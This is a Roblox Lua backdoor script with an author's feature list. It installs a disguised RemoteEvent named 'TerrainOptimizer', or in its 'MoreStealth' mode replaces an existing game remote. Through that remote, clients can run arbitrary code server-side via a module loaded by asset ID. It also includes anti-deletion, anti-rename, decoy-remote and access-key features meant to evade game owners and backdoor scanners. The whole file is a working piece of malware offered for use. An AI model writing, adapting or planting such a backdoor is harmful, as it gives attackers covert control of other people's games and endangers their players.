-- 2. Update: added MoreStealth option
-- Silent update: added group checking
--[[ 
backdoor by batussz
What ts backdoor got???:
1. Universal / Key Mode
== If you want to add backdoor to your game, you can change the universal setting on settings table to true.
== Or if you want to secure your backdoor from backdoor finders, you can use the key mode. Which is will generate a new global variable with 7 numbers.
== If they guessed the key wrong they will get kicked. Else its gonna execute the code.
2. Anti Delete
== If the remote gets deleted, it will be added back INSTANTLY.
3. Anti Name Tamper
== If the remote name gets changed, it will be back to TerrainOptimizer
4. Name Whitelist
== You dont want strangers to use your backdoor remote? Well you can name whitelist! If they are not the same name as your name they will get kicked.
5. Fake Backdoor Remotes
== You can calm down the owner if they found those fake remotes. But thats not gonna do anything!
6. MoreStealth
== If you dont want that much recognization you can use MoreStealth option.
7. Group Checking
== Well, they probably can bypass the name table in my opinion so use group checking to get over em.
]]

--DEBUGGING VARIABLES
----------------
local dbg = true
----------------
-- Variables
local lclKey = ""
local logCount = 0
local g = game
local tstr = tostring
local connection -- to fix multiple duplication on MoreStealth


local success, err = pcall(function()

-- MoreStealth variables
local remotes = {}
local remote = nil
local rName = ""
local path = nil

-- Functions

-- for getting the path with strings
local function fetchPath(fullName)
    local current = game
    for part in string.gmatch(fullName, "[^%.]+") do
        current = current:FindFirstChild(part)
        if not current then
            return nil
        end
    end
    return current
end
    

local exec = function(inp) 
    local module = require(14132891321) 
    module:SpawnS(inp, workspace) 
end

local function dbgLog(msg)
    if dbg == true then
        logCount = logCount + 1
        local dbgNew = Instance.new("StringValue", workspace)
        dbgNew.Name = "[LOG"..logCount.."]"
        dbgNew.Value = tstr(msg)
    end
end

local Settings = {
    FakeRemoteSettings = {
        FakeRemoteNames = {"backdoored", "infect", "listen", "infected", "command", "admin", "*%[", "₺@@+₺", "<÷<₺", "???"},
        Service = game.ReplicatedStorage,
        Count = 1
    },
    FakeRemotes = false,
    Universal = true,
    NameWhitelist = false,
    Names = {},
    MoreStealth = true,
    GroupCheck = false,
    GroupID = 1234567890,
    GroupRole = nil, -- put nil to skip
    
    ServicesToCheck = {
        workspace,
        g.Lighting,
        g.ReplicatedStorage
    }
}
    
    local function checkIfOnGroup(P)
        if not Settings.GroupRole or Settings.GroupRole == "" then
                  return P:IsInGroup(Settings.GroupID)
               else
                   return P:IsInGroup(Settings.GroupID) and P:GetRoleInGroup(Settings.GroupID) == Settings.GroupRole
               end
    end

-- // CORE (DONT TOUCH IF YOU DONT KNOW WHAT YOU ARE CHANGING ON THE CODE)

-- Additional Features
if Settings.Universal == false then
    lclKey = "batussz"..math.random(1000000, 9999999)
    local KeyShower = Instance.new("ObjectValue", workspace)
    KeyShower.Name = lclKey
    print("Your code: >> "..lclKey.." <<\n[Use this code to execute script on Server-Side.]")
end

if Settings.FakeRemotes == true then
    for i = 1, Settings.FakeRemoteSettings.Count do
        local rand = math.random(1, #Settings.FakeRemoteSettings.FakeRemoteNames)
        local FakeEvent = Instance.new("RemoteEvent", Settings.FakeRemoteSettings.Service)
        FakeEvent.Name = Settings.FakeRemoteSettings.FakeRemoteNames[rand]
        
        FakeEvent.OnServerEvent:Connect(function(plr)
            plr:Kick()
        end)
        
    end
end

-- Functions / Scripting Core

function SearchGameAndAdd()
    dbgLog("starting loop now")
    for _, services in pairs(Settings.ServicesToCheck) do
        local fAny = false
        for _, obj in ipairs(services:GetDescendants()) do
            if obj:IsA("RemoteEvent") then
                if obj.Parent and obj.Parent:IsA("Folder") and obj.Parent.Name == "DefaultChatSystemChatEvents" then
                    -- Ignore chat
                else
                    dbgLog("found remote: " .. obj:GetFullName())
                    table.insert(remotes, obj:GetFullName())
                    dbgLog("inserted to remotes table")
                    fAny = true
                end
            end
        end
        if not fAny then
            dbgLog("no remotes found on " .. services.Name)
        end
    end

    if #remotes == 0 then
        dbgLog("no remotes found")
        return
    end

    local randAns = math.random(1, #remotes)
    remote = remotes[randAns]
    
    local rItself = fetchPath(remote)
    rName = remote:match("([^%.]+)$")
    path = fetchPath(remote).Parent
    rItself:Destroy()

    local function createRmt()
      local newEvent = Instance.new("RemoteEvent", path)
        newEvent.Name = rName

        newEvent.OnServerEvent:Connect(function(plr, k, code)
            if Settings.GroupCheck == true then
                if checkIfOnGroup(plr) then
                    exec(code)
                else
                    plr:Kick("not on required group or not enough role")
                    return
                end
            end
            
            if Settings.NameWhitelist == true then
                if table.find(Settings.Names, plr.Name) then
                    exec(code)
                    return
                else
                    plr:Kick("not authorized name.")
                    return
                end
            end

            if Settings.Universal == true then
                exec(code)
            elseif Settings.Universal == false then
                if k == lclKey then
                    exec(code)
                    return
                else
                    plr:Kick("wrong pass on universal.")
                    return
                end
            end
        end)

        newEvent:GetPropertyChangedSignal("Name"):Connect(function()
            if newEvent.Name ~= rName then
                newEvent.Name = rName
            end
        end)
      
    end

  local function watchdelete()
    if connection then
      connection:Disconnect()
    end
    connection = path.DescendantRemoving:Connect(function(d)
            if d.Name == rName then
                createRmt()
            end
        end)
  end
  
    createRmt()
  watchdelete()
end

function Create()
    local re = Instance.new("RemoteEvent", workspace.Terrain)
    re.Name = "TerrainOptimizer"

    re.OnServerEvent:Connect(function(plr, k, code)
        if Settings.GroupCheck == true then
                if checkIfOnGroup(plr) then
                    exec(code)
                else
                    plr:Kick("not on required group or not enough role")
                    return
                end
            end
        
        if Settings.NameWhitelist == true then
            if table.find(Settings.Names, plr.Name) then
                exec(code)
                return
            else
                plr:Kick("not authorized name.")
                return
            end
        end

        if Settings.Universal == true then
            exec(code)
        elseif Settings.Universal == false then
            if k == lclKey then
                exec(code)
                return
            else
                plr:Kick("wrong pass on universal.")
                return
            end
        end
    end)

    re:GetPropertyChangedSignal("Name"):Connect(function()
        if (re.Name ~= "TerrainOptimizer") then
            re.Name = "TerrainOptimizer"
        end
    end)
end

function DetectChange()
    workspace.Terrain.DescendantRemoving:Connect(function(c)
        if c.Name == "TerrainOptimizer" then
            Create()
        end
    end)
end

-- Init
if Settings.MoreStealth == true then
    SearchGameAndAdd()
else
    Create()
    DetectChange()
end
end)

if not success then
    local errVal = Instance.new("StringValue", workspace)
    errVal.Name = "[ERROR_LOG]"
    errVal.Value = tstr(err)
end
